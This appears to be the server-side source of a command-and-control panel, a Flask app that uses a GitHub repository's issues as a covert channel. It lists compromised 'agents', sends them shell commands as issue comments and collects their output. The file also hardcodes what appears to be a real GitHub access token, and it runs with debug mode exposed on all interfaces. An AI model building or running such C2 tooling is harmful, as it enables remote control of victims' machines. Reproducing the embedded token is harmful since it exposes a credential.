from flask import Flask, request, jsonify, render_template
import requests

app = Flask(__name__)

# GitHub settings
GITHUB_TOKEN = "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"
GITHUB_REPO = "CaptShiva007/C2-Channel"
HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/agents', methods=['GET'])
def get_agents():
    response = requests.get(f"https://api.github.com/repos/{GITHUB_REPO}/issues", headers=HEADERS)
    
    if response.status_code == 200:
        issues = response.json()
        agents = []
        for issue in issues:
            if "Agent Registered:" in issue["title"]:
                parts = issue["title"].split(" | ")
                if len(parts) == 2:
                    hostname = parts[0].replace("Agent Registered: ", "").strip()
                    uid = parts[1].strip()
                    agents.append({"id": issue["number"], "hostname": hostname, "uid": uid})
        return jsonify(agents)
    return jsonify([]), 500

@app.route('/agent/<int:agent_id>', methods=['GET'])
def get_agent_details(agent_id):
    response = requests.get(f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}", headers=HEADERS)
    if response.status_code == 200:
        issue = response.json()
        return jsonify({
            "hostname": issue["title"].split(" | ")[0],
            "id": issue["number"],
            "os": "Windows"  # Assuming Windows based on agent.go implementation
        })
    return jsonify({"error": "Agent not found"}), 404

@app.route('/history', methods=['GET'])
def get_history():
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify([])
    
    response = requests.get(
        f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}/comments",
        headers=HEADERS
    )
    
    history = []
    if response.status_code == 200:
        comments = response.json()
        for comment in comments:
            body = comment.get("body", "")
            if body.startswith("Command: "):
                command = body[len("Command: "):].strip()
                history.append({"command": command, "output": "Pending..."})
            elif "```" in body:
                output = body.strip('```\n').strip()
                if history:
                    history[-1]["output"] = output
    return jsonify(history)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    agent_id = data.get("agent")
    command = data.get("message")

    if not agent_id or not command:
        return jsonify({"error": "Invalid request"}), 400

    response = requests.post(
        f"https://api.github.com/repos/{GITHUB_REPO}/issues/{agent_id}/comments",
        json={"body": f"Command: {command}"},
        headers=HEADERS
    )

    if response.status_code == 201:
        return jsonify({"success": "Command submitted"}), 200
    return jsonify({"error": "Failed to send command"}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)